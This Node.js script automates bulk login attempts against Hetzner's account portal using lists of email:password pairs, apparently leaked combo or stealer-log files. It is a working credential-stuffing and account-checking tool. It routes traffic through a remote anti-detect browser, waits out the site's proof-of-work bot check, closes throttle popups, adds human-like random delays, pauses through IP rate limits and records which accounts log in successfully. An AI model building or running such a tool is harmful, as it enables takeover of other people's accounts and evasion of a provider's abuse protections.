#!/usr/bin/env node
/**
 * Hetzner (accounts.hetzner.com) login automation via remote CloakBrowser profile.
 *
 * Flow mapped:
 *   GET https://accounts.hetzner.com/login
 *     -> may land on /_ray/pow (Heray "Security Check" POW) - auto-resolves in ~12s
 *     -> #login-form -> POST /login_check with _username, _password, _csrf_token
 *     -> 302 back to /login with error flash, or 302 away to the console (success)
 *
 * Verdicts:
 *   INVALID_CREDS  "Invalid credentials." flash on /login
 *   THROTTLED      "There have been too many login attempts! Please wait for 600 seconds..." (IP-wide, 10 min)
 *   POW            stuck on /_ray/pow longer than ~40s (retryable)
 *   SUCCESS        redirect away from /login (http(s))
 *
 * Usage:
 *   node hetzner_login.mjs "user:pass" "user2:pass2" ...
 *   node hetzner_login.mjs --batch <file> [--gap 15] [--out /tmp/hz_batch_results.json]
 *                          [--throttle-pause 630]   seconds to sleep on IP-wide throttle
 *
 * Input lines: `email:pass` or `url:user:pass` (hetzner_com.txt format).
 * Results JSON is resumable; definitive statuses are skipped on restart.
 */
import { chromium } from '/Volumes/Spare/npm/global/lib/node_modules/@playwright/mcp/node_modules/playwright/index.mjs';
import fs from 'node:fs';

const CDP = process.env.CK_CDP || 'wss://clk.mrme.tech/api/profiles/912925dd-a2fc-48db-b364-0259330952cd/cdp';
const TOKEN = process.env.CBPM_API_TOKEN || 'change-me-to-a-secure-token';
const LOGIN = 'https://accounts.hetzner.com/login';

const rand = (a, b) => Math.round(a + Math.random() * (b - a));
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function connect() {
  return chromium.connectOverCDP(CDP, { timeout: 30000, headers: { Authorization: 'Bearer ' + TOKEN } });
}

async function typeField(page, sel, text) {
  // fill (not type): Hetzner's client-side login handler renders the error flash
  // only when values are set atomically; keystroke typing suppresses it
  await page.fill(sel, text);
  await sleep(rand(120, 350));
}

async function waitForLoginForm(page) {
  // /_ray/pow (Heray security check) auto-redirects to /login; wait it out
  let stable = 0;
  for (let i = 0; i < 25; i++) {
    const onForm = await page.evaluate(() => !!document.querySelector('#login-form')).catch(() => false);
    if (onForm && ++stable >= 2) { await sleep(1500); return true; } // form present 2 polls in a row = settled
    if (!onForm) stable = 0;
    await sleep(2000);
  }
  return false;
}

async function tryLogin(browser, u, p) {
  const ctx = browser.contexts()[0];
  const page = await ctx.newPage();
  try {
    // NOTE: no clearCookies here - Hetzner keys the login flash + CSRF to the
    // session created by the /login GET; wiping it breaks the error flash.
    await page.goto(LOGIN, { waitUntil: 'load', timeout: 60000 }).catch(() => {});
    if (!(await waitForLoginForm(page))) {
      return { status: 'POW', detail: 'stuck on ' + page.url().slice(0, 70) + ' (Heray check did not resolve)' };
    }

    await typeField(page, '#_username', u);
    await sleep(rand(300, 700));
    await typeField(page, '#_password', p);
    await sleep(rand(400, 900));

    // dismiss any popup modals (appear when the IP is throttled/flagged) that
    // would block the submit button
    for (let i = 0; i < 3; i++) {
      const closed = await page.evaluate(() => {
        const btns = [...document.querySelectorAll('button')].filter(b => /close/i.test((b.innerText || '').trim()));
        for (const b of btns) {
          const vis = b.offsetParent !== null || getComputedStyle(b).display !== 'none';
          if (vis) { b.click(); return true; }
        }
        return false;
      }).catch(() => false);
      if (!closed) break;
      await sleep(rand(800, 1500));
    }

    await page.click('#login-form button[type=submit], #login-form input[type=submit]', { timeout: 30000 })
      .catch(() => page.click('#login-form button[type=submit], #login-form input[type=submit]', { timeout: 30000, force: true }));
    await sleep(rand(7000, 9000));

    const state = await page.evaluate(() => ({
      url: location.href,
      alerts: [...document.querySelectorAll('.alert, .error, [class*=error], [class*=message]')].map(e => e.innerText.trim().replace(/\s+/g, ' ')).filter(Boolean).slice(0, 4),
      body: document.body.innerText.replace(/\s+/g, ' ').slice(0, 300),
    })).catch(() => ({ url: page.url(), alerts: [], body: '' }));
    return classify(state);
  } finally {
    await page.close().catch(() => {});
  }
}

function classify(o) {
  const t = (o.alerts && o.alerts.join(' ')) + ' ' + o.body;
  if (/too many login attempts|wait for 600 seconds/i.test(t)) return { status: 'THROTTLED', detail: t.slice(0, 120) };
  if (/invalid credentials/i.test(t)) return { status: 'INVALID_CREDS', detail: t.slice(0, 100) };
  const onLogin = /\/login$|\/login\?/.test(o.url);
  if (!onLogin && /^https?:\/\//.test(o.url) && !/_ray/.test(o.url)) return { status: 'SUCCESS', detail: 'redirected to ' + o.url.slice(0, 90) };
  if (!/^https?:\/\//.test(o.url)) return { status: 'ERROR', detail: 'connection failed: ' + o.url.slice(0, 60) };
  return { status: 'UNKNOWN', detail: t.slice(0, 140) };
}

/** Accept `email:pass` or `url:user:pass`. */
function parsePair(line) {
  line = line.trim();
  if (!line) return null;
  const parts = line.split(':');
  if (parts.length < 2) return null;
  // url:user:pass (hetzner_com.txt) - url part contains a dot + slash
  if (/^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(parts[0])) {
    if (parts.length < 3) return null;
    return [parts[1], parts.slice(2).join(':')];
  }
  return [parts[0], parts.slice(1).join(':')];
}

// ---- main ----
const args = process.argv.slice(2);
const batchIdx = args.indexOf('--batch');
const raw = batchIdx !== -1 ? args[batchIdx + 1] : args.filter(a => !a.startsWith('--')).join(',');
const lines = (raw && fs.existsSync(raw) ? fs.readFileSync(raw, 'utf8').split('\n') : (raw || '').split(',')).map(parsePair).filter(Boolean);
const seen = new Set();
const pairs = lines.filter(([u]) => (seen.has(u) ? false : (seen.add(u), true)));
if (!pairs.length) { console.log('usage: node hetzner_login.mjs "user:pass" | --batch <file>'); process.exit(1); }

const gapIdx = args.indexOf('--gap');
const GAP_BASE = gapIdx !== -1 ? Number(args[gapIdx + 1]) || 15 : 15;
const outIdx = args.indexOf('--out');
const OUT = outIdx !== -1 ? args[outIdx + 1] : '/tmp/hz_batch_results.json';
const thIdx = args.indexOf('--throttle-pause');
const THROTTLE_PAUSE = thIdx !== -1 ? Number(args[thIdx + 1]) || 630 : 630;
const results = fs.existsSync(OUT) ? JSON.parse(fs.readFileSync(OUT, 'utf8')) : {};
const SKIP_STATUS = { INVALID_CREDS: 1, SUCCESS: 1 };

let browser = null;
try {
  for (const [u, p] of pairs) {
    if (results[u] && SKIP_STATUS[results[u].status]) { console.log(`${u} -> SKIP (already ${results[u].status})`); continue; }
    if (!browser) browser = await connect();
    let res;
    try {
      res = await tryLogin(browser, u, p);
      console.log(`${u} -> ${res.status} (${res.detail})`);
      if (res.status === 'THROTTLED') {
        // IP-wide 10-min throttle: pause so the rest of the batch isn't wasted
        console.log(`IP throttled; pausing ${THROTTLE_PAUSE}s...`);
        await sleep(THROTTLE_PAUSE * 1000);
      }
    } catch (e) {
      console.log(`${u} -> ERROR: ${e.message.slice(0, 100)}`);
      res = { status: 'ERROR', detail: e.message.slice(0, 150) };
      try { await browser.close(); } catch {}
      browser = null;
    }
    results[u] = res;
    fs.writeFileSync(OUT, JSON.stringify(results, null, 1));
    if (batchIdx !== -1 && pairs.length > 1) { const gap = rand(GAP_BASE * 0.5, GAP_BASE * 1.5) * 1000; console.log('waiting ' + Math.round(gap / 1000) + 's...'); await sleep(gap); }
  }
} finally {
  if (browser) await browser.close().catch(() => {});
}
console.log('results saved to ' + OUT);
